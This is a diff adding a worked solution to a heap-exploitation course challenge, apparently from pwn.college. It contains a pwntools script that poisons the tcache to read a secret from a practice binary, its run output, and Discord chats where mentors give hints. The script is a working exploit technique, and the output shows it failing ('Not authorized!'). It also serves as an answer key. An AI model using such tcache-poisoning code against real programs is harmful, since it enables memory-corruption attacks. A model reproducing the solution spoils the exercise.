@@ -3922,3 +3922,256 @@ p.sendline(secret.encode())
 print(p.recvuntil(b"}").decode())
 ```
 
+```py
+from pwn import *
+
+p = process("/challenge/seeking-smuggled-secrets-easy", level='error')
+
+# Get secret address
+p.recvuntil(b"secret stored at ")
+secret_addr = int(p.recvuntil(b".").strip(b".").decode(), 16)
+print(f"[*] Secret at: {hex(secret_addr)}")
+
+# Allocate two chunks
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+p.recvuntil(b"quit):")
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+p.recvuntil(b"quit):")
+
+# Free both chunks
+p.sendline(b"free")
+p.sendline(b"1")
+p.recvuntil(b"quit):")
+
+p.sendline(b"free")
+p.sendline(b"0")
+p.recvuntil(b"quit):")
+
+# Poison tcache with secret address
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(secret_addr))
+p.recvuntil(b"quit):")
+
+# Get chunk 0 back
+p.sendline(b"malloc")
+p.sendline(b"2")
+p.sendline(b"128")
+p.recvuntil(b"quit):")
+
+# This malloc reads the secret!
+p.sendline(b"malloc")
+p.sendline(b"3")
+p.sendline(b"128")
+p.recvuntil(b"quit):")
+
+# Free chunk 2 to examine the tcache state
+p.sendline(b"free")
+p.sendline(b"2")
+p.recvuntil(b"quit):")
+
+# Read from chunk 2 - the first 8 bytes are the secret!
+p.sendline(b"puts")
+p.sendline(b"2")
+p.recvuntil(b"Data: ")
+first_half = p.recv(8)
+
+print(f"[*] First 8 bytes: {first_half} ({first_half.hex()})")
+
+# Poison again to point to second half
+p.sendline(b"scanf")
+p.sendline(b"2")
+p.sendline(p64(secret_addr + 8))
+p.recvuntil(b"quit):")
+
+# Allocate to consume chunk 2
+p.sendline(b"malloc")
+p.sendline(b"4")
+p.sendline(b"128")
+p.recvuntil(b"quit):")
+
+# Allocate at secret_addr + 8
+p.sendline(b"malloc")
+p.sendline(b"5")
+p.sendline(b"128")
+p.recvuntil(b"quit):")
+
+# Free chunk 4 and read it
+p.sendline(b"free")
+p.sendline(b"4")
+p.recvuntil(b"quit):")
+
+p.sendline(b"puts")
+p.sendline(b"4")
+p.recvuntil(b"Data: ")
+second_half = p.recv(8)
+
+print(f"[*] Second 8 bytes: {second_half} ({second_half.hex()})")
+
+# Combine both halves
+secret = first_half + second_half
+print(f"[*] Complete secret: {secret}")
+
+# Submit the flag
+p.sendline(b"send_flag")
+p.sendline(secret)
+result = p.recvall(timeout=2).decode()
+print(result)
+```
+
+```
+hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-easy:~$ python ~/script.py
+[*] Secret at: 0x429360
+[*] First 8 bytes: b'lbaaifox' (6c62616169666f78)
+[*] Second 8 bytes: b'h\x93B\n+===' (6893420a2b3d3d3d)
+[*] Complete secret: b'lbaaifoxh\x93B\n+==='
+=================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3f4c12c0           | KEY: 0x3f4c1010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3f4c12c0          | 0                   | 0x91 (P)                     | 0x429368            | 0x3f4c1010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Secret: 
+Not authorized!
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3f4c12c0           | KEY: 0x3f4c1010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3f4c12c0          | 0                   | 0x91 (P)                     | 0x429368            | 0x3f4c1010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Unrecognized choice!
+### Goodbye!
+```
+
+
+```
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 03:07
+This one got me I really can’t figure it out is it about overwriting the ptr array?
+Sammy
+
+:ninja: — 22/10/2025, 03:29
+overwriting the ptr array is overkill
+what happens when you try and malloc the secret addr?
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 03:29
+The check fires and i fail to allocate
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 03:30
+Yub it is💀
+Sammy
+
+:ninja: — 22/10/2025, 03:32
+i dont think you fail to allocate
+does the malloc go through?
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 03:32
+Aha it allocates fine but after that ptr been assigned to zero
+So I don’t know how to access it again
+Sammy
+
+:ninja: — 22/10/2025, 03:34
+do you need to access it again?
+why do you care about the secret addr? what do you want from it?
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 03:36
+The data inside
+The secret itself
+I thought about that for almost 3 hours and didn’t get anything
+Sammy
+
+:ninja: — 22/10/2025, 03:37
+correct. i would say examine the tcache state before and after you try and allocate the secret addr
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 03:38
+Okay i will check again
+0xStrawHat
+
+Role icon, White Belt — 22/10/2025, 04:01
+pwned
+thanks man I was overcomplicating things I don't know why 
+
+```
+
+```
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:25
+I am having trouble on smuggled secrets, idk how much I can really ask here without revealing some parts of it but I am currently struggling on getting a stack leak. I can go into more detail if necessary, but does anyone have any pointers?
+Sammy
+
+:ninja: — 13/10/2025, 08:27
+a stack leak?
+you're talking about seeking smuggled secrets?
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:27
+yeah, it's the one where you can't write over the secret so I'm trying to write into the array storing the pointers
+yes
+glueless
+
+Role icon, Blue Belt — 13/10/2025, 08:27
+ahaha pointers
+Sammy
+
+:ninja: — 13/10/2025, 08:27
+I see. It can be done
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:28
+it feels overcomplicated for what it is, idk if I'm going the wrong direction
+glueless
+
+Role icon, Blue Belt — 13/10/2025, 08:28
+it's kinda overkill that early but smart to have figured out already
+Sammy
+
+:ninja: — 13/10/2025, 08:28
+but that will require startegies that employ heap concepts beyond the tcache
+Sammy
+
+:ninja: — 13/10/2025, 08:28
+its not a wrong direction. Just a very long one
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:28
+yeah that's what i was running into, I didn't want to go down that rabbit hole cause i feel like there has to be an easier way
+and the checkpoint is in 4 hrs and i can figure that part out later
+Sammy
+
+:ninja: — 13/10/2025, 08:29
+well
+what can you do?
+and what cant you do?
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:32
+so i know I can't write below 0x430000, and the secret is at 0x42something, I can't leak the stack array without doing all of the other stuff since it's randomized, I'm thinking there has to be another address in the bss that gets used that I can somehow use in a different way 
+glueless
+
+Role icon, Blue Belt — 13/10/2025, 08:35
+there's multiple ways to approach this. you can either take advantage of what could be inserted or what is erased 
+Sammy
+
+:ninja: — 13/10/2025, 08:44
+I would tell you to focus more on the state of the tcache around the malloc
+here is a question
+does the malloc go through when you try and malloc the secret?
+RenegadePenguin #IFailedCSE466
+
+:ninja: — 13/10/2025, 08:45
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 08:46
+alright well I think I sort of see what you're getting at, i have something else I need to do right now I'll think it over and maybe itll come to me in a little bit
+thank you guys
+2stinkysocksRole icon, Orange Belt — 13/10/2025, 10:09
+got it
+```
